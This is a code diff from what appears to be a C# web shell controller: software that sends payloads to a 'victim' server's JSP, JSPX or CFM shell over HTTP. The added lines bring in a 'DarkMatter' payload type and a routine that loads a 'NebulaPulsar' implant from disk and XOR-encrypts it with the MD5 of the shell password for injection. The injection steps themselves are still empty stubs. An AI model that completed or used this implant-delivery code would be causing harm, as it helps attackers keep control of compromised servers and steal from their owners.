@@ -663,6 +663,12 @@ namespace Alien
                         "application/json"
                     );
                 }
+                else if (config.payloadType == enPayloadType.DarkMatter)
+                {
+                    // Inject NebulaPulsar first
+
+                    
+                }
                 else
                 {
                     // OneShell
@@ -1022,6 +1028,32 @@ namespace Alien
             return await fnHttpPOST(m_victim.m_ShellConfig, new Dictionary<stShellConfig, string>(), szPayload, szSplitter, bShowError);
         }
 
+        private async Task<string?> fnInjectNebulaPulsar(stShellConfig config)
+        {
+            try
+            {
+                string szKey = config.szPassword;
+                string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
+                byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
+
+                byte[]? abNebulaPulsar = fnGetNebulaPulsar(config);
+                if (abNebulaPulsar == null)
+                    throw new Exception("NebulaPulsar is null or empty.");
+
+                byte[] abEncryptedImplant = clsCrypto.fnXorEncrypt(abNebulaPulsar, abHashKey);
+
+
+
+                return null;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+                return string.Empty;
+            }
+        }
+
         private async Task<string> fnNebulaPulsar(string szPayloadName, string[] asParams, bool bShowError = true)
         {
             try
@@ -1175,7 +1207,6 @@ namespace Alien
             if (s.Length % 4 != 0) return false;
             return Regex.IsMatch(s, @"^[a-zA-Z0-9\+/]*={0,3}$", System.Text.RegularExpressions.RegexOptions.None);
         }
-
 
         private async Task<(stShellConfig config, string? szURL, string? szComet, List<string>? lsSplitter)> fnDriftingComet(List<stShellConfig> lsConfig, object payload)
         {
@@ -1374,6 +1405,21 @@ namespace Alien
                 return null;
             
             bool bIsJava = m_victim.ShellLanguage == enLanguage.JSP || m_victim.ShellLanguage == enLanguage.JSPX || m_victim.ShellLanguage == enLanguage.CFM;
+
+            string szPath = Path.Combine(Application.StartupPath, "Payload", szLang, "NebulaPulsar", "DarkMatter", "NebulaPulsar." + (bIsJava ? "class" : "dll"));
+            if (!Path.Exists(szPath))
+                return null;
+
+            return File.ReadAllBytes(szPath);
+        }
+
+        private byte[]? fnGetNebulaPulsar(stShellConfig config)
+        {
+            string? szLang = Enum.GetName(typeof(enLanguage), config.language);
+            if (string.IsNullOrEmpty(szLang))
+                return null;
+
+            bool bIsJava = config.language == enLanguage.JSP || config.language == enLanguage.JSPX || config.language == enLanguage.CFM;
 
             string szPath = Path.Combine(Application.StartupPath, "Payload", szLang, "NebulaPulsar", "DarkMatter", "NebulaPulsar." + (bIsJava ? "class" : "dll"));
             if (!Path.Exists(szPath))
